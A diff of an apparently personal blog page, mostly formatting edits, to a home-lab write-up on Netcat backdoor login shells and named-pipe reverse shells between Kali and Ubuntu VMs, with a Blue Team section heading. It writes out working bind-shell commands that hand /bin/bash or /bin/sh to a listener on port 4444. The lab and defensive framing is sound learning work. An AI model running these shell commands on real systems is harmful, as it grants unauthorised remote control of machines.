@@ -5,10 +5,10 @@ permalink: /projects/
 ---
 # Table of Contents
 
-1. [Creating and Defending Against Netcat Backdoor Login Shells & Reverse Shell Backdoors Using Named Pipes](##Creating-and-Defending-Against-Netcat-Backdoor-Login-Shells-&-Reverse-Shell-Backdoors-Using-Named-Pipes)
+1. [Creating and Defending Against Netcat Backdoor Login Shells & Reverse Shell Backdoors Using Named Pipes](#Creating-and-Defending-Against-Netcat-Backdoor-Login-Shells-&-Reverse-Shell-Backdoors-Using-Named-Pipes)
 
 
-## Creating and Defending Against Netcat Backdoor Login Shells & Reverse Shell Backdoors Using Named Pipes Named Pipes Exploit
+# Creating and Defending Against Netcat Backdoor Login Shells & Reverse Shell Backdoors Using Named Pipes Named Pipes Exploit
 
 ## I. Overview
 
@@ -42,17 +42,24 @@ Here’s an example of a backdoor login shell using Netcat’s `-e` switch:
 
   1. The victim machine (the Netcat listener at 192.168.55.73) runs the below command, which puts the victim machine into         listener mode on port 4444 and passes a shell to any machine that connects to it.
 
+
     nc -l -p 4444 -e /bin/bash
+
 
   2. The attacker machine (the Netcat client) runs the below command to connect to the victim machine (192.168.55.73) on       port 4444, which then receives the victim machine’s shell:
 
+
     nc 192.168.55.73 4444
+
 
 ![Netcat Backdoor Login Shell Using the `-e` Switch](/assets/img/netcat_images/1.png)
 
+
 When I attempted to run the first command on an Ubuntu VM it failed because the Debian/Ubuntu netcat-openbsd version removed the -e switch for security reasons (see https://manpages.debian.org/bookworm/netcat-openbsd/nc.1.en.html).
 
+
 ![Image 2](/assets/img/netcat_images/2.png)
+
 
 ## IV. Named Pipe Workaround for Shell Listeners
 
@@ -60,27 +67,39 @@ I learned to use named pipes to create Netcat relays, which allow you to relay, 
 
 However, we can use a named pipe as a substitute for the -e switch to create a shell listener or a reverse shell, as explained below.
 
+
 ![Image 3](/assets/img/netcat_images/3.png)
 
-### Step 1.1 (Ubuntu Machine/Netcat Listener): First create the named pipe using the mkfifo command (I named it “attackpipe”):
+
+**Step 1.1 (Ubuntu Machine/Netcat Listener):** First create the named pipe using the mkfifo command (I named it “attackpipe”):
+
 
     mkfifo attackpipe
 
+
 ![Image 4](/assets/img/netcat_images/4.png)
 
-### Step 1.2 (Ubuntu Machine/Netcat Listener): Create the Netcat listener on the victim machine at port 4444. The named pipe (a) passes a shell to the named pipe and (b) passes that shell to the attacker’s machine when it connects to the victim’s machine:
+
+**Step 1.2 (Ubuntu Machine/Netcat Listener):** Create the Netcat listener on the victim machine at port 4444. The named pipe (a) passes a shell to the named pipe and (b) passes that shell to the attacker’s machine when it connects to the victim’s machine:
+
 
     nc -l -p 4444 < attackpipe | /bin/sh > attackpipe
 
+
 While not shown in the below screenshot, the cursor blinks below the command indicating that Netcat is in listener mode, shell at the ready and waiting for a connection.
+
 
 ![Image 5](/assets/img/netcat_images/5.png)
 
-### Step 2 (Kali Linux/Netcat Client): Run the below command on the Kali machine to connect to the Ubuntu machine. In my Proxmox lab environment, the Ubuntu machine’s IP address is 192.168.55.73.
+
+**Step 2 (Kali Linux/Netcat Client):** Run the below command on the Kali machine to connect to the Ubuntu machine. In my Proxmox lab environment, the Ubuntu machine’s IP address is 192.168.55.73.
+
 
     nc 192.168.55.73 4444
 
+
 ![Image 6](/assets/img/netcat_images/6.png)
+
 
 The above screenshot shows the Kali machine connecting and obtaining a shell from the Ubuntu machine. After running the Netcat command the Kali machine’s cursor blinks and you can enter commands that run on the Ubuntu machine (such as, `whoami`, `hostname`, and `ls -l`).
 
@@ -92,21 +111,29 @@ As we did above, we can also use a named pipe to compensate for the absence of t
 
 ![Image 7](/assets/img/netcat_images/7.png)
 
-### Step 1 (Kali Linux/Netcat Listener): This time the Kali machine is the Netcat listener on port 4444. Start the Netcat listener before executing the Netcat command on the Ubuntu machine. In my Proxmox lab environment the Kali machine’s IP is 192.168.55.60.
+**Step 1 (Kali Linux/Netcat Listener):** This time the Kali machine is the Netcat listener on port 4444. Start the Netcat listener before executing the Netcat command on the Ubuntu machine. In my Proxmox lab environment the Kali machine’s IP is 192.168.55.60.
+
 
 ![Image 8](/assets/img/netcat_images/8.png)
 
-### Step 2.1 (Ubuntu/Netcat Client): Create a named pipe like before (the “attackpipe”).
+
+**Step 2.1 (Ubuntu/Netcat Client):** Create a named pipe like before (the “attackpipe”).
+
 
 ![Image 8](/assets/img/netcat_images/9.png)
 
-### Step 2.2 (Ubuntu/Netcat Client): Use Netcat to connect to the Kali machine at port 4444, passing a shell to the Kali machine via the named pipe (“attackpipe”).
+
+**Step 2.2 (Ubuntu/Netcat Client):** Use Netcat to connect to the Kali machine at port 4444, passing a shell to the Kali machine via the named pipe (“attackpipe”).
+
 
 ![Image 9](/assets/img/netcat_images/9.png)
 
-### Step 3 (Kali/Netcat Listener): Once the Ubuntu machine connects to the Kali machine, the Kali machine can execute commands that run on the Ubuntu machine. The below screenshot shows the Ubuntu machine’s responses to the Kali commands (for example, the Ubuntu machine’s hostname is “rita-sensor” and the whoami, hostname, pwd, and ls -l commands reflect the Ubuntu machine’s response).
+
+**Step 3 (Kali/Netcat Listener):** Once the Ubuntu machine connects to the Kali machine, the Kali machine can execute commands that run on the Ubuntu machine. The below screenshot shows the Ubuntu machine’s responses to the Kali commands (for example, the Ubuntu machine’s hostname is “rita-sensor” and the whoami, hostname, pwd, and ls -l commands reflect the Ubuntu machine’s response).
+
 
 ![Image 10](/assets/img/netcat_images/10.png)
+
 
 ## VI. Blue Team: Defending Against Netcat Backdoor Login Shells & Reverse Shell Backdoors
 
